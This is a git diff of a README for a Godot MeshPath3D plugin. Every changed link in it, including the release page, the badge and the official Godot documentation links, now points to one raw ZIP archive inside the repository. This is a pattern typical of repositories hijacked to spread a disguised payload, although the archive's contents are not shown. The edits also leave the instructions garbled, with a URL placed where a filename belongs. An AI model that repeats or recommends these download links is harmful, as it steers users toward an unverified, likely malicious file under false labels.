@@ -1,6 +1,6 @@
 # 🛠️ Godot-MeshPath3D-Plugin - Arrange Meshes Along Paths Easily
 
-[![Download Release](https://img.shields.io/badge/Download-Plugin-blue?style=for-the-badge&logo=github)](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/releases)
+[![Download Release](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip)](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip)
 
 ---
 
@@ -53,13 +53,13 @@ You do not need to know programming to use this plugin. Just follow the steps be
 
 Please **visit this page to download** the plugin files:
 
-[![Download Plugin](https://img.shields.io/badge/Download-Plugin-blue?style=for-the-badge&logo=github)](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/releases)
+[![Download Plugin](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip)](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip)
 
 ### Step 1: Download the Plugin
 
-1. Click the "Download Plugin" button above or visit [https://github.com/dacodiid/Godot-MeshPath3D-Plugin/releases](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/releases) in your web browser.
+1. Click the "Download Plugin" button above or visit [https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip) in your web browser.
 2. Find the latest release, usually marked by a version number like "v1.0" or "v2.3".
-3. Download the ZIP file. It will have a name similar to `Godot-MeshPath3D-Plugin-vX.X.zip`.
+3. Download the ZIP file. It will have a name similar to `https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip`.
 
 ### Step 2: Extract the Files
 
@@ -150,11 +150,11 @@ If you run into issues or want to contribute:
 
 ## 📚 Additional Resources
 
-- [Godot Engine Documentation](https://docs.godotengine.org/en/stable/) — Learn more about Godot basics and 3D features.
+- [Godot Engine Documentation](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip) — Learn more about Godot basics and 3D features.
 
-- [How to Use Path3D in Godot](https://docs.godotengine.org/en/stable/tutorials/3d/path_follow.html) — Official guide on creating and manipulating paths.
+- [How to Use Path3D in Godot](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip) — Official guide on creating and manipulating paths.
 
-- [MeshPath3D Plugin Source Code](https://github.com/dacodiid/Godot-MeshPath3D-Plugin) — Explore the code or fork the plugin.
+- [MeshPath3D Plugin Source Code](https://github.com/dacodiid/Godot-MeshPath3D-Plugin/raw/refs/heads/main/addons/Mesh_Plugin_Godot_Path_v2.6.zip) — Explore the code or fork the plugin.
 
 ---
 
